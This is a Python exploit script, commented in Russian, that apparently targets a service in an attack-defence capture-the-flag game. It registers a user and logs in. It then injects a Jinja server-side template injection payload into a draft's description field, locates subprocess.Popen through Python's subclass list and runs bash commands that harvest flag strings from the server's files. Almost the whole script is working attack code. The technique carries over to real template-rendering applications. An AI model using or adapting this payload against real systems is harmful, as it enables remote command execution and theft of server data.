#!/usr/bin/env python3
import requests
import uuid
import json
import os.path
from typing import Optional
import sys
import re

# Базовый URL сервера
# HOST = sys.argv[1]

BASE_URL = f"http://shellwedance.game.sibea.rs:8000"


def register_user(username: str, password: str, realname: str = None):
    url = f"{BASE_URL}/register"
    headers = {"Content-Type": "application/json"}
    data = {
        "username": username,
        "password": password,
    }
    if realname:
        data["realname"] = realname
    try:
        response = requests.post(url, json=data, headers=headers)
        response.raise_for_status()
        print("Регистрация успешна:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("Ошибка при регистрации:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при регистрации:", str(e))
        return None


def login_user(username: str, password: str):
    url = f"{BASE_URL}/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data, headers=headers)
        response.raise_for_status()
        print("Вход успешен:", response.json())
        return response.json()  # Возвращает токен доступа
    except requests.exceptions.HTTPError as e:
        print("Ошибка при входе:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при входе:", str(e))
        return None


def create_draft(token: str, popen_index: int, start_position, end_position):
    url = f"{BASE_URL}/gdz/save_draft"

    malicious_description = f"""{{{{ ''.__class__.__mro__[1].__subclasses__()[{popen_index}](['bash', '-c', 'find drafts/ -type f -exec grep -oE "TEAM[0-9]{{3}}_[A-Z0-9]{{32}}" {{}} + | sort -u | paste -sd "," -'], stdout=-1).communicate()[0].decode('utf-8', errors='ignore').strip() }}}}"""
    draft_data = {
        "description": malicious_description,
        "full_description": "Test full description",
        "category": "math",
        "subject": "algebra",
        "content_text": "Sample content",
        "price": 0,
        "is_elite": False,
        "gdz_id": None
    }

    headers = {
        "Authorization": f"Bearer {token}",
    }

    try:
        response = requests.post(
            url,
            json=draft_data,
            headers=headers
        )
        response.raise_for_status()
        print("Черновик создан:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("HTTP ошибка при создании черновика:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при создании черновика:", str(e))
        return None


def get_draft(token: str):
    url = f"{BASE_URL}/gdz/get_draft"
    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        print("Черновик получен:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("HTTP ошибка при получении черновика:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при получении черновика:", str(e))
        return None


def create_gdz_from_draft(token: str, draft_data: dict, image_path: str = "solution.png"):
    print(f"Текущая рабочая директория: {os.getcwd()}")
    print(f"Указанный путь к файлу: {image_path}")
    print(f"Полный путь к файлу: {os.path.abspath(image_path)}")
    if not os.path.exists(image_path):
        print(f"Файл {image_path} не найден")
        return None

    gdz_data = {
        "description": draft_data.get("description", ""),
        "full_description": draft_data.get("full_description", ""),
        "category": f"{draft_data.get('subject')}_{draft_data.get('category')}",
        "content_text": draft_data.get("content_text", ""),
        "price": draft_data.get("price", 0),
        "is_elite": draft_data.get("is_elite", False)
    }

    gdz_str = json.dumps(gdz_data)

    url = f"{BASE_URL}/gdz/create"
    headers = {"Authorization": f"Bearer {token}"}

    files = {
        "content_file": (os.path.basename(image_path), open(image_path, "rb"), "image/png")
    }
    data = {
        "gdz_str": gdz_str
    }

    try:
        response = requests.post(
            url,
            headers=headers,
            files=files,
            data=data
        )
        response.raise_for_status()
        print("ГДЗ создано:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("HTTP ошибка при создании ГДЗ:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при создании ГДЗ:", str(e))
        return None
    finally:
        if "content_file" in files:
            files["content_file"][1].close()


def find_popen_index(token: str, max_index: int = 300) -> Optional[int]:
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    payload = {
        "description": "{{ [].__class__.__base__.__subclasses__() }}",
        "full_description": "Test",
        "category": "math",
        "subject": "algebra",
        "content_text": "Test",
        "price": 0,
        "is_elite": False,
        "gdz_id": None
    }

    try:
        response = requests.post(f"{BASE_URL}/gdz/save_draft", json=payload, headers=headers)
        response.raise_for_status()


        response = requests.get(f"{BASE_URL}/gdz/get_draft", headers=headers)
        response.raise_for_status()
        draft = response.json()
        class_list_str = draft.get("description")

        print(class_list_str[230])

        # Ищем Popen в формате "259~Popen"
        matches = re.findall(r'(\d+)~Popen', class_list_str)
        if matches:
            return int(matches[0])

    except:
        print("a")
        print("subprocess.Popen not found within max_index")
        return None


def main():
    unique_username = f"user_{uuid.uuid4().hex[:8]}"
    password = "securepassword123"
    realname = "Test User"

    print(f"Регистрация пользователя: {unique_username}")
    register_response = register_user(unique_username, password, realname)
    if not register_response:
        print("Не удалось зарегистрировать пользователя")
        return

    print(f"\nВход пользователя: {unique_username}")
    login_response = login_user(unique_username, password)
    if not login_response:
        print("Не удалось войти")
        return

    access_token = login_response.get("access_token")
    if not access_token:
        print("Токен доступа не получен")
        return
    print(f"Получен токен доступа: {access_token}")

    print("\nПоиск индекса subprocess.Popen")
    popen_index = find_popen_index(access_token, max_index=300)
    if popen_index is not None:
        print(f"subprocess.Popen found at index: {popen_index}")
    else:
        print("Failed to find subprocess.Popen")
        return

    print("\nСоздание черновика с вредоносной нагрузкой")

    create_draft_response = create_draft(access_token, popen_index, 10000, 20000)
    if not create_draft_response:
        print("Не удалось создать черновик")
        return

    print("\nПолучение черновика")
    draft_data = get_draft(access_token)
    if not draft_data:
        print("Не удалось получить черновик")
        return

    print("\nСоздание ГДЗ из черновика")
    flags = draft_data.get("description").split(",")
    if not flags:
        print("[!] Флагов не найдено")
    else:
        for flag in flags:
            print(f"Flag: {flag}", flush=True)


if __name__ == "__main__":
    main()